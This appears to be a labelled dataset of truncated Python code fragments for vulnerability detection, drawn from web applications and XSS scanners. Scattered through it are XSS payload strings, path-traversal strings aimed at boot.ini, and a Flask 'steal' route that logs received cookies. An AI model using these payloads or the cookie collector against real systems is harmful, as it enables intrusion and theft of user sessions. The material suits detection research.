get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 53550, "code": ":list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params", "label": 0}, {"snippet_id": 22054, "code": "='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry", "label": 0}, {"snippet_id": 18266, "code": "[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\")", "label": 1}, {"snippet_id": 43323, "code": "\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore", "label": 0}, {"snippet_id": 20670, "code": "', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views", "label": 0}, {"snippet_id": 15708, "code": " Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping", "label": 0}, {"snippet_id": 33653, "code": "=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments", "label": 0}, {"snippet_id": 27415, "code": " \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split", "label": 0}, {"snippet_id": 51411, "code": "/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import gettext_lazy as _ BASE_DIR=os.path.dirname(os.path.abspath(__file__)) SETTINGS_PATH=os.path.normpath(os.path", "label": 0}, {"snippet_id": 35088, "code": "\t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t", "label": 0}, {"snippet_id": 45450, "code": ".content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']", "label": 0}, {"snippet_id": 54752, "code": " return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class=ArticleForm success_url='/' def", "label": 0}, {"snippet_id": 24380, "code": " this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest", "label": 0}, {"snippet_id": 45280, "code": "=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties", "label": 0}, {"snippet_id": 32342, "code": " rpath) print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README", "label": 0}, {"snippet_id": 19409, "code": "-with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes", "label": 0}, {"snippet_id": 47073, "code": " model view.\"\"\" filter_converter=FilterConverter() can_create=False can_edit=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated', 'created',) column_details_list=('id'", "label": 0}, {"snippet_id": 37374, "code": "\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not", "label": 0}, {"snippet_id": 29846, "code": "\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command", "label": 0}, {"snippet_id": 23597, "code": ") import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url", "label": 0}, {"snippet_id": 31903, "code": "=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>') \t\t\tif form.getvalue('bwlists_restart')=='restart': \t\t\t\tfunct.ssh_command(server[2", "label": 0}, {"snippet_id": 33033, "code": ".encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def __init__(self, has_a_single_h1): super(_AdjustTOC, self).__init__() self.has_a_single_h1=has_a_single_h1 def run(self, tree", "label": 0}, {"snippet_id": 38903, "code": "\tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in", "label": 0}, {"snippet_id": 1451, "code": "\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0", "label": 0}, {"snippet_id": 34640, "code": "\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 15883, "code": " self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks", "label": 0}, {"snippet_id": 46362, "code": "'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status': -1} collection=json.loads(request.POST.get('collection', ", "label": 0}, {"snippet_id": 53872, "code": ") def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------", "label": 0}, {"snippet_id": 28884, "code": "\t\tif e==\"No such file or directory\": \t\t\treturn '%s. Check ssh key' % e \t\t\tpass \t\telif e==\"Invalid argument\": \t\t\terror='Check the IP of the server' \t\t\tpass \t\telse: \t\t\terror=e\t \t\t\tpass \t\treturn str(error", "label": 0}, {"snippet_id": 52535, "code": "'copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties:", "label": 0}, {"snippet_id": 27198, "code": "<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1)", "label": 1}, {"snippet_id": 20128, "code": " are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data()", "label": 0}, {"snippet_id": 25124, "code": "-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=", "label": 0}, {"snippet_id": 38841, "code": "(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise", "label": 0}, {"snippet_id": 19994, "code": "'foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__", "label": 0}, {"snippet_id": 38778, "code": "\t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse", "label": 0}, {"snippet_id": 43735, "code": "\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide", "label": 0}, {"snippet_id": 11936, "code": " import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/", "label": 0}, {"snippet_id": 43486, "code": " continue \t\t\tnew_password=self.get(df.fieldname) \t\t\tif new_password and not self.is_dummy_password(new_password): \t\t\t\t \t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t", "label": 0}, {"snippet_id": 38746, "code": ".__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get", "label": 0}, {"snippet_id": 1305, "code": "'url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print", "label": 0}, {"snippet_id": 47506, "code": " Active\", checked=m)) if profile: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email', button_text=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f", "label": 0}, {"snippet_id": 53920, "code": " ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a'", "label": 0}, {"snippet_id": 4936, "code": " '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()/", "label": 0}, {"snippet_id": 38786, "code": ", value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self", "label": 0}, {"snippet_id": 19156, "code": "{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"", "label": 0}, {"snippet_id": 50928, "code": " GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import Group, User from django.contrib.humanize.templatetags.humanize import", "label": 0}, {"snippet_id": 25147, "code": " import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring import", "label": 0}, {"snippet_id": 21189, "code": "'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.", "label": 0}, {"snippet_id": 8381, "code": "'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights", "label": 0}, {"snippet_id": 26073, "code": "=False f.widget.is_required=False if 'required' in f.widget.attrs: del f.widget.attrs['required'] elif event.settings.invoice_address_company_required and not self.all_optional: self.initial['is_business", "label": 0}, {"snippet_id": 21111, "code": "\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses", "label": 0}, {"snippet_id": 29766, "code": "\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t\treturn_files.add(file) \t\treturn sorted(return_files", "label": 0}, {"snippet_id": 50114, "code": " now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid in to_remove", "label": 0}, {"snippet_id": 12337, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^", "label": 0}, {"snippet_id": 34872, "code": "=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t", "label": 0}, {"snippet_id": 43357, "code": ".in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and", "label": 0}, {"snippet_id": 26794, "code": "'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 31444, "code": "\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha", "label": 0}, {"snippet_id": 8759, "code": " 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES", "label": 0}, {"snippet_id": 10151, "code": ") self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec", "label": 0}, {"snippet_id": 7130, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ", "label": 0}, {"snippet_id": 20647, "code": " name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$',", "label": 0}, {"snippet_id": 4639, "code": "', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', ", "label": 0}, {"snippet_id": 37263, "code": " \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself", "label": 0}, {"snippet_id": 36800, "code": ".comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\"", "label": 0}, {"snippet_id": 54228, "code": ".grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl\",background='light sky blue').grid(row=8) Label(main, text=\"\",background='light sky blue').grid", "label": 0}, {"snippet_id": 33942, "code": " \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1", "label": 0}, {"snippet_id": 5752, "code": " formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '", "label": 0}, {"snippet_id": 14038, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views", "label": 0}, {"snippet_id": 20901, "code": "\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url", "label": 0}, {"snippet_id": 5283, "code": " 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe", "label": 0}, {"snippet_id": 25685, "code": " else: widget=forms.CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text, initial", "label": 1}, {"snippet_id": 46045, "code": ".can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e,", "label": 0}, {"snippet_id": 675, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url", "label": 1}, {"snippet_id": 49201, "code": ", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column", "label": 0}, {"snippet_id": 21655, "code": "]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', ", "label": 0}, {"snippet_id": 35211, "code": ".fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef", "label": 0}, {"snippet_id": 43315, "code": "=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"", "label": 0}, {"snippet_id": 32758, "code": " '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=", "label": 0}, {"snippet_id": 33466, "code": ".escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"): \t\t\t\t\tself.found(injection_types, url, parameter, payload) \t\t\t\t\treturn True \t\treturn False \t \tdef signature(self): \t\treturn{\"XSS\":", "label": 1}, {"snippet_id": 39011, "code": "\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif", "label": 0}, {"snippet_id": 18597, "code": "/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name", "label": 0}, {"snippet_id": 6952, "code": " url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', ", "label": 0}, {"snippet_id": 6202, "code": " be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy logfiles(string", "label": 0}, {"snippet_id": 45254, "code": " '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data", "label": 0}, {"snippet_id": 20201, "code": ".imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self):", "label": 0}, {"snippet_id": 51307, "code": "-1] fields=('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password') def save_model(self, request, obj, form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet", "label": 0}, {"snippet_id": 52028, "code": ".decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES", "label": 0}, {"snippet_id": 54028, "code": " need to install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d", "label": 0}, {"snippet_id": 42582, "code": " \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname", "label": 0}, {"snippet_id": 38809, "code": " self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__", "label": 0}, {"snippet_id": 13116, "code": "'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error", "label": 0}, {"snippet_id": 23985, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be", "label": 0}, {"snippet_id": 29112, "code": " chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \tssh_command", "label": 0}, {"snippet_id": 47139, "code": " model.json is None: return True record=Record(model.json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record", "label": 0}, {"snippet_id": 23580, "code": ".instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')),", "label": 0}, {"snippet_id": 8459, "code": ".urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=(''", "label": 0}, {"snippet_id": 7063, "code": ", 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views", "label": 0}, {"snippet_id": 26143, "code": ".invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings", "label": 0}, {"snippet_id": 31801, "code": "+form.getvalue('color')+' list. %s </div>' % e) \t\t if form.getvalue('bwlists_save'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color", "label": 0}, {"snippet_id": 16638, "code": "<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course", "label": 0}, {"snippet_id": 9009, "code": ")$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 33787, "code": "\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: ", "label": 1}, {"snippet_id": 22560, "code": "'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki", "label": 0}, {"snippet_id": 3140, "code": " in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\",", "label": 0}, {"snippet_id": 29905, "code": "\t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form.getvalue", "label": 0}, {"snippet_id": 24912, "code": ".save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded,", "label": 0}, {"snippet_id": 49902, "code": " web client consists of two components running on twisted and django. They are both a part of the Evennia website url tree(so the testing website might be located on http://localhost:4001/, whereas the", "label": 0}, {"snippet_id": 4913, "code": "%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror", "label": 0}, {"snippet_id": 2789, "code": " True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\"", "label": 0}, {"snippet_id": 34747, "code": "} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d", "label": 0}, {"snippet_id": 35528, "code": ".fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t", "label": 0}, {"snippet_id": 15880, "code": "=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, ", "label": 0}, {"snippet_id": 188, "code": ".path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging", "label": 0}, {"snippet_id": 14294, "code": ", ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course", "label": 0}, {"snippet_id": 10431, "code": ") class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp", "label": 0}, {"snippet_id": 869, "code": ".append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact", 